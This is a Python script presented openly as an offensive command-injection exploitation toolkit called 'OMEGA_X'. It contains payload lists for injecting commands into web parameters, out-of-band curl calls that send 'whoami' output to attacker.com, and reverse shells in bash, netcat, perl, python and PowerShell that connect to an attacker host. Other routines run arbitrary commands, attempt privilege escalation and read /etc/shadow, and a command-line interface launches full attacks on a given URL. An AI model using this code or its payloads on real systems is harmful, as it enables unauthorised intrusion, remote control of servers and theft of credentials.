#!/usr/bin/env python3
"""
OMEGA_X Command Injection Suite
================================

Advanced command injection exploitation toolkit.

This module provides comprehensive command injection capabilities:
- Web application command injection
- OS command injection vectors
- Blind command injection techniques
- Out-of-band command injection
- Payload generation and testing

TARGETS:
- Web applications with command injection vulnerabilities
- Network services accepting user input
- APIs with command execution capabilities
- Legacy systems with shell access

PAYLOADS:
- Basic command injection: ; ls
- Encoded payloads: $(echo 'ls' | base64 -d)
- Time-based blind: sleep 5
- Out-of-band: curl attacker.com/$(whoami)

AUTHOR: OMEGA_X Development Team
VERSION: 1.0
"""

import os
import sys
import time
import socket
import requests
import subprocess
import threading
from datetime import datetime
import argparse
import base64
import urllib.parse
import re

try:
    from scapy.all import *
except ImportError:
    print("Missing scapy dependency")
    sys.exit(1)

class CommandInjectionExploiter:
    """Advanced command injection exploitation system"""

    def __init__(self, target_url=None, injection_point=None):
        self.target_url = target_url
        self.injection_point = injection_point  # e.g., "cmd", "exec", "run"
        self.session = requests.Session()
        self.vulnerable = False
        self.os_type = None
        self.attack_log = []

        # Command injection payloads
        self.payloads = {
            "basic": [
                "; ls",
                "| ls",
                "`ls`",
                "$(ls)",
                "; whoami",
                "| whoami",
                "$(whoami)"
            ],
            "encoded": [
                "$(echo 'bHM=' | base64 -d)",
                "`echo 'ls' | base64 -d`",
                "$(printf '\\154\\163')",
                "`printf '\\154\\163'`"
            ],
            "blind_time": [
                "; sleep 5",
                "| sleep 5",
                "`sleep 5`",
                "$(sleep 5)",
                "; ping -c 5 127.0.0.1",
                "| ping -n 5 127.0.0.1"
            ],
            "blind_oob": [
                "; curl http://attacker.com/$(whoami)",
                "| curl http://attacker.com/$(whoami)",
                "`curl http://attacker.com/$(whoami)`",
                "$(curl http://attacker.com/$(whoami))"
            ],
            "advanced": [
                "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
                "| nc attacker.com 4444 -e /bin/bash",
                "`perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\")};'`",
                "$(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);')"
            ]
        }

    def log(self, message, level="info"):
        """Log injection attempts"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] [{level.upper()}] {message}"
        self.attack_log.append(log_entry)
        print(log_entry)

    def detect_os(self):
        """Detect target operating system"""
        self.log("Detecting target OS...")

        os_payloads = {
            "linux": ["; uname -a", "| uname -a", "$(uname -a)"],
            "windows": ["; ver", "| ver", "$(ver)"],
            "macos": ["; sw_vers", "| sw_vers", "$(sw_vers)"]
        }

        for os_name, payloads in os_payloads.items():
            for payload in payloads:
                if self.test_injection(payload):
                    response = self.inject_payload(payload)
                    if os_name in response.lower():
                        self.os_type = os_name
                        self.log(f"Target OS detected: {os_name}")
                        return True

        self.log("OS detection failed")
        return False

    def test_injection(self, payload):
        """Test if command injection is possible"""
        try:
            data = {self.injection_point: f"echo 'test'{payload}"}
            response = self.session.post(self.target_url, data=data, timeout=10)

            # Check for command execution indicators
            if "test" in response.text and ("uid=" in response.text or "gid=" in response.text or "root" in response.text):
                return True

        except Exception as e:
            self.log(f"Test failed: {e}", "warning")

        return False

    def inject_payload(self, payload, timeout=30):
        """Inject a command payload"""
        try:
            data = {self.injection_point: payload}
            response = self.session.post(self.target_url, data=data, timeout=timeout)
            return response.text
        except Exception as e:
            self.log(f"Injection failed: {e}", "error")
            return ""

    def scan_vulnerabilities(self):
        """Scan for command injection vulnerabilities"""
        self.log("Scanning for command injection vulnerabilities...")

        if not self.target_url or not self.injection_point:
            self.log("Target URL and injection point required", "error")
            return False

        # Test basic payloads
        for payload in self.payloads["basic"]:
            if self.test_injection(payload):
                self.vulnerable = True
                self.log(f"Vulnerable to: {payload}")
                return True

        # Test encoded payloads
        for payload in self.payloads["encoded"]:
            if self.test_injection(payload):
                self.vulnerable = True
                self.log(f"Vulnerable to encoded: {payload}")
                return True

        self.log("No vulnerabilities found")
        return False

    def execute_command(self, command):
        """Execute arbitrary command on target"""
        if not self.vulnerable:
            self.log("Target not vulnerable", "error")
            return ""

        self.log(f"Executing command: {command}")

        # Try different injection methods
        injection_methods = [
            f"; {command}",
            f"| {command}",
            f"`{command}`",
            f"$({command})",
            f"; bash -c '{command}'",
            f"| bash -c '{command}'"
        ]

        for method in injection_methods:
            try:
                output = self.inject_payload(method, timeout=60)
                if output and len(output) > 0:
                    self.log(f"Command executed successfully")
                    return output
            except:
                continue

        self.log("Command execution failed", "error")
        return ""

    def extract_system_info(self):
        """Extract system information"""
        self.log("Extracting system information...")

        commands = {
            "os": "uname -a || ver",
            "user": "whoami || echo %USERNAME%",
            "home": "echo $HOME || echo %USERPROFILE%",
            "path": "echo $PATH || echo %PATH%",
            "processes": "ps aux || tasklist",
            "network": "ifconfig || ipconfig",
            "disk": "df -h || wmic logicaldisk get size,freespace,caption"
        }

        info = {}
        for key, cmd in commands.items():
            output = self.execute_command(cmd)
            info[key] = output.strip() if output else "N/A"

        return info

    def establish_reverse_shell(self, attacker_ip, attacker_port=4444):
        """Establish reverse shell connection"""
        self.log(f"Establishing reverse shell to {attacker_ip}:{attacker_port}")

        if self.os_type == "linux" or self.os_type is None:
            # Linux reverse shell payloads
            payloads = [
                f"; bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1",
                f"| nc {attacker_ip} {attacker_port} -e /bin/bash",
                f"`perl -e 'use Socket;$i=\"{attacker_ip}\";$p={attacker_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\")}};'`",
                f"$(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);')"
            ]
        else:
            # Windows payloads
            payloads = [
                f"; powershell -c \"\\$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',{attacker_port});\\$stream = \\$client.GetStream();[byte[]]\\$bytes = 0..65535|%{{0}};while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){{;\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);\\$sendback = (iex \\$data 2>&1 | Out-String );\\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '> ';\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);\\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);\\$stream.Flush()}};\\$client.Close()\"",
                f"| nc.exe {attacker_ip} {attacker_port} -e cmd.exe"
            ]

        for payload in payloads:
            self.log(f"Trying payload: {payload[:50]}...")
            self.inject_payload(payload, timeout=5)
            time.sleep(2)  # Give time for connection

        self.log("Reverse shell attempts completed")

    def blind_injection_attack(self, attacker_url):
        """Perform blind command injection attack"""
        self.log("Starting blind command injection attack...")

        # Time-based blind injection
        for payload in self.payloads["blind_time"]:
            start_time = time.time()
            self.inject_payload(payload, timeout=10)
            elapsed = time.time() - start_time

            if elapsed >= 5:
                self.log(f"Blind injection successful: {payload}")
                self.vulnerable = True
                break

        # Out-of-band blind injection
        for payload in self.payloads["blind_oob"]:
            # Replace attacker.com with actual URL
            modified_payload = payload.replace("attacker.com", attacker_url)
            self.inject_payload(modified_payload, timeout=5)

        self.log("Blind injection attack completed")

    def run_injection_attack(self):
        """Run complete command injection attack"""
        self.log("üöÄ Starting OMEGA_X Command Injection Attack")
        self.log("=" * 50)

        if not self.target_url:
            self.log("No target URL specified", "error")
            return False

        # Vulnerability scanning
        if not self.scan_vulnerabilities():
            self.log("No command injection vulnerabilities found", "warning")
            return False

        # OS detection
        self.detect_os()

        # Information extraction
        info = self.extract_system_info()
        self.log("System information extracted")

        # Attempt privilege escalation
        self.attempt_privilege_escalation()

        # Data exfiltration
        self.exfiltrate_data()

        self.log("üéØ Command injection attack completed successfully")
        return True

    def attempt_privilege_escalation(self):
        """Attempt privilege escalation"""
        self.log("Attempting privilege escalation...")

        escalation_commands = [
            "sudo -u root /bin/bash",
            "su root",
            "chmod +s /bin/bash",
            "pkexec --user root /bin/bash"
        ]

        for cmd in escalation_commands:
            self.execute_command(cmd)

    def exfiltrate_data(self):
        """Exfiltrate sensitive data"""
        self.log("Exfiltrating sensitive data...")

        exfil_commands = [
            "cat /etc/passwd",
            "cat /etc/shadow",
            "find / -name *.db 2>/dev/null",
            "history",
            "env"
        ]

        for cmd in exfil_commands:
            output = self.execute_command(cmd)
            if output:
                self.log(f"Exfiltrated: {len(output)} bytes")

def main():
    parser = argparse.ArgumentParser(description="OMEGA_X Command Injection Exploiter")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--param", required=True, help="Injection parameter name")
    parser.add_argument("--command", help="Single command to execute")
    parser.add_argument("--reverse-shell", nargs=2, metavar=('IP', 'PORT'),
                       help="Establish reverse shell to IP:PORT")
    parser.add_argument("--blind", action="store_true", help="Perform blind injection attack")
    parser.add_argument("--attacker-url", help="Attacker URL for OOB exfiltration")

    args = parser.parse_args()

    exploiter = CommandInjectionExploiter(
        target_url=args.url,
        injection_point=args.param
    )

    if args.command:
        # Execute single command
        output = exploiter.execute_command(args.command)
        print(f"Command output:\n{output}")
    elif args.reverse_shell:
        # Establish reverse shell
        ip, port = args.reverse_shell
        exploiter.establish_reverse_shell(ip, int(port))
    elif args.blind:
        # Blind injection attack
        if not args.attacker_url:
            print("Attacker URL required for blind attacks")
            sys.exit(1)
        exploiter.blind_injection_attack(args.attacker_url)
    else:
        # Full attack
        success = exploiter.run_injection_attack()
        if success:
            print("\nüéâ Command injection successful!")
        else:
            print("\n‚ùå Command injection failed!")
            sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nüõë Attack interrupted by user")
    except Exception as e:
        print(f"‚ùå Fatal error: {e}")
        sys.exit(1)
